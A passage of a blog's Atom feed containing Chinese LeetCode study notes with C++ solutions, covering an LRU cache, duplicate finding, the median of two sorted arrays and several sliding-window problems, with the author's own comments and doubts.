class="keyword">if</span>(size&gt;capacity)&#123;<span class="comment">//容量超出</span></span><br><span class="line">                Node *del_node = <span class="built_in">removeTail</span>();<span class="comment">//被删结点</span></span><br><span class="line">                <span class="comment">//同时删去哈希表中 对应项</span></span><br><span class="line">                cache.<span class="built_in">erase</span>(del_node-&gt;key);</span><br><span class="line">                <span class="comment">//防止内存泄漏</span></span><br><span class="line">                <span class="keyword">delete</span> del_node;</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//已经存在，则需要更新 val</span></span><br><span class="line">            Node *node = cache[key];</span><br><span class="line">            <span class="comment">//不更新 哈希表吗？？？？？？？？？？？</span></span><br><span class="line">            node-&gt;val = value;</span><br><span class="line">            <span class="built_in">moveToHead</span>(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="287-寻找重复数"><a href="#287-寻找重复数" class="headerlink" title="287 寻找重复数"></a>287 寻找重复数</h3><p>给定一个包含 n + 1 个整数的数组 nums ，其数字都在 [1, n] 范围内（包括 1 和 n），可知至少存在一个重复的整数。<br>假设 nums 只有 一个重复的整数 ，返回 这个重复的数 。<br>你设计的解决方案必须 <strong>不修改 数组 nums</strong> 且<strong>只用常量级 O(1) 的额外空间</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//哈希表 但是使用了额外空间</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:nums)&#123;</span><br><span class="line">            maap[num]++;</span><br><span class="line">            <span class="keyword">if</span>(maap[num]&gt;=<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//快慢指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>, fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">        &#125;<span class="keyword">while</span>(slow!=fast);</span><br><span class="line">        slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(slow!=fast)&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[fast];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4 寻找两个正序数组的中位数"></a>4 寻找两个正序数组的中位数</h3><p>给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。<br>**算法的时间复杂度应该为 O(log (m+n))**。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O(m+n) 我没优化，以后再说吧</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>(), n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nums</span><span class="params">(m+n)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> nums2;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> nums1;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;m &amp;&amp; j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums1[i]&lt;=nums2[j])&#123;</span><br><span class="line">                nums[k++] = nums1[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums[k++] = nums2[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;m)&#123;</span><br><span class="line">            nums[k++]=nums1[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;n)&#123;</span><br><span class="line">            nums[k++]=nums2[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; nums;</span><br><span class="line">        nums = <span class="built_in">merge</span>(nums1,nums2);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">            cout &lt;&lt; nums[i];</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="comment">//if(nums.size()==1)</span></span><br><span class="line">        <span class="keyword">int</span> x = (m+n);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;x=&quot;</span>&lt;&lt;x/<span class="number">2</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">double</span> res;</span><br><span class="line">        <span class="keyword">if</span>(x%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            res = nums[x/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">            res = (nums[x/<span class="number">2</span>]+nums[x/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>八、滑动窗口</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%85%AB%E3%80%81%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%85%AB%E3%80%81%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</id>
    <published>2025-12-03T06:15:20.000Z</published>
    <updated>2025-12-03T06:15:20.947Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="八、滑动窗口"><a href="#八、滑动窗口" class="headerlink" title="八、滑动窗口"></a>八、滑动窗口</h2><h3 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76 最小覆盖子串"></a>76 最小覆盖子串</h3><p>给你一个字符串 s 、一个字符串 t 。返回 s 中<strong>涵盖 t 所有字符</strong>的【最小子串】。如果 s 中不存在涵盖 t 所有字符的子串，则返回空字符串 “” 。</p><p>注意：</p><pre><code>对于 t 中重复字符，我们寻找的子字符串中该字符数量必须不少于 t 中该字符数量。如果 s 中存在这样的子串，我们保证它是唯一的答案。</code></pre><p><img src="https://img-blog.csdnimg.cn/94cc3dbdfe7748eeab0d01e4c0c9f2ab.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; need, window;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : t) need[c]++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> valid = <span class="number">0</span>;<span class="comment">//记录已正确匹配的 字符个数</span></span><br><span class="line">    <span class="comment">// 记录最小覆盖子串的起始索引及长度</span></span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, len = INT_MAX;</span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="comment">// c 是将移入窗口的字符</span></span><br><span class="line">        <span class="keyword">char</span> c = s[right];</span><br><span class="line">        <span class="comment">// 右移窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        <span class="keyword">if</span> (need.<span class="built_in">count</span>(c)) &#123;</span><br><span class="line">            window[c]++;</span><br><span class="line">            <span class="keyword">if</span> (window[c] == need[c])<span class="comment">//保证数量一致</span></span><br><span class="line">                valid++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断左侧窗口是否要收缩</span></span><br><span class="line">        <span class="keyword">while</span> (valid == need.<span class="built_in">size</span>()) &#123;<span class="comment">//注意是while</span></span><br><span class="line">            <span class="comment">// 在这里更新最小覆盖子串</span></span><br><span class="line">            <span class="keyword">if</span> (right-left &lt; len) &#123;</span><br><span class="line">                start = left;</span><br><span class="line">                len = right-left;<span class="comment">//更新长度</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// d 是将移出窗口的字符</span></span><br><span class="line">            <span class="keyword">char</span> d = s[left];</span><br><span class="line">            <span class="comment">// 左移窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            <span class="keyword">if</span> (need.<span class="built_in">count</span>(d)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (window[d] == need[d])</span><br><span class="line">                    valid--;</span><br><span class="line">                window[d]--;</span><br><span class="line">            &#125;                    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回最小覆盖子串</span></span><br><span class="line">    <span class="keyword">return</span> len == INT_MAX ?</span><br><span class="line">        <span class="string">&quot;&quot;</span> : s.<span class="built_in">substr</span>(start, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="567-字符串的排列"><a href="#567-字符串的排列" class="headerlink" title="567 字符串的排列"></a>567 字符串的排列</h3><p>给你两个字符串 s1 和 s2 ，写一个函数来判断 s2 是否包含 s1 的排列。如果是，返回 true ；否则，返回 false 。<br>换句话说，s1 的排列之一是 s2 的 子串 。<br><strong>注意：得是连续的-子串</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">checkInclusion</span><span class="params">(string s1, string s2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need,window;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:s1)</span><br><span class="line">            need[c]++;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; s2.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s2[right];</span><br><span class="line">            right++;<span class="comment">//右移窗口</span></span><br><span class="line">            <span class="keyword">if</span>(need.<span class="built_in">count</span>(c))&#123;</span><br><span class="line">                window[c]++;</span><br><span class="line">                <span class="keyword">if</span>(window[c] == need[c])</span><br><span class="line">                    valid++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//什么时候左移？当窗口</span></span><br><span class="line">            <span class="comment">//if(valid == s1.size())&#123;</span></span><br><span class="line">            <span class="keyword">while</span>(right-left &gt; s1.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">char</span> d = s2[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(valid == need.<span class="built_in">size</span>())</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">也可以</span><br><span class="line">            <span class="keyword">while</span>(valid == need.<span class="built_in">size</span>())&#123;<span class="comment">//注意：是比较need.size()</span></span><br><span class="line">                <span class="keyword">if</span>(right-left == s1.<span class="built_in">size</span>())</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">char</span> d = s2[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h3 id="209-长度最小的子数组——滑动窗口i表示终止位置"><a href="#209-长度最小的子数组——滑动窗口i表示终止位置" class="headerlink" title="209 长度最小的子数组——滑动窗口i表示终止位置"></a>209 长度最小的子数组——滑动窗口i表示终止位置</h3><p>给定一个含有 n 个正整数的数组和一个正整数 target 。<br>找出该数组中满足其和 ≥ target 的【长度最小】的 <strong>连续子数组</strong> [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(n^2)     ans = min(ans,j-i+1);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;<span class="comment">//初始化 无穷大</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;<span class="comment">//j=i;</span></span><br><span class="line">                sum += nums[j];</span><br><span class="line">                <span class="keyword">if</span>(sum&gt;=target)&#123;</span><br><span class="line">                    ans = <span class="built_in">min</span>(ans,j-i+<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == INT_MAX ? <span class="number">0</span>:ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滑动窗口：如何移动起始位置</span></span><br><span class="line"><span class="comment">    注意：如果i表示的是起始位置的话，其本质上与暴力解法并没有什么不同，依然要遍历i后面的所有元素。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;<span class="comment">//初始化 无穷大</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;<span class="comment">//起始位置,只有找到一个满足条件的集合之后，再+1移动</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//i 终止位置，不断向前遍历</span></span><br><span class="line">            sum += nums[i];</span><br><span class="line">            <span class="keyword">while</span>(sum&gt;=target)&#123;</span><br><span class="line">                ans = <span class="built_in">min</span>(ans,i-j+<span class="number">1</span>);</span><br><span class="line">                sum -= nums[j];<span class="comment">//注意：i向后移动1的时候，和sum 也需要减去【当前集合 的 起始值nums[j]】</span></span><br><span class="line">                j++;<span class="comment">//重点：滑动！！</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == INT_MAX ? <span class="number">0</span>:ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-无重复字符的最长子串——双指针、滑动窗口"><a href="#3-无重复字符的最长子串——双指针、滑动窗口" class="headerlink" title="3 无重复字符的最长子串——双指针、滑动窗口"></a>3 无重复字符的最长子串——双指针、滑动窗口</h3><p>给定一个字符串 s ，请你找出其中【不含有重复字符的最长子串的长度】。<br><img src="https://img-blog.csdnimg.cn/14c8c43b2eb24be293a7bb7c64161825.png"><br>我们使用两个指针表示字符串中的某个子串（或窗口）的左右边界，其中左指针代表着上文中「枚举子串的起始位置」，而右指针即为上文中的 rk​；<br>在枚举结束后，我们找到的最长的子串的长度即为答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针 unordered_set&lt;char&gt; seen;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;<span class="keyword">char</span>&gt; seen;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">-1</span>, res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//依次遍历</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                seen.<span class="built_in">erase</span>(s[i<span class="number">-1</span>]);<span class="comment">//除了第一次之外，之后每次都需要删去前一个元素</span></span><br><span class="line">            <span class="keyword">while</span>(r+<span class="number">1</span>&lt;n &amp;&amp; !seen.<span class="built_in">count</span>(s[r+<span class="number">1</span>]))&#123;<span class="comment">//遍历右指针，不断向右滑，直到找到重复 字符为止</span></span><br><span class="line">                seen.<span class="built_in">insert</span>(s[r+<span class="number">1</span>]);</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res,r-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//滑动窗口</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; window;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>; <span class="comment">// 记录结果</span></span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">char</span> c = s[right];</span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        window[c]++;</span><br><span class="line">        <span class="comment">// 判断左侧窗口是否要收缩【当字符重复时】</span></span><br><span class="line">        <span class="keyword">while</span> (window[c] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> d = s[left];</span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            window[d]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新结果</span></span><br><span class="line">        res = <span class="built_in">max</span>(res, right-left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h3 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438 找到字符串中所有字母异位词"></a>438 找到字符串中所有字母异位词</h3><p>给定两个字符串 s 和 p，找到 s 中所有 p 的 异位词 的子串。<br>【返回这些子串的起始索引】。不考虑答案输出的顺序。<br><strong>异位词</strong>：指由相同字母【重排列】形成的字符串（包括相同的字符串）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 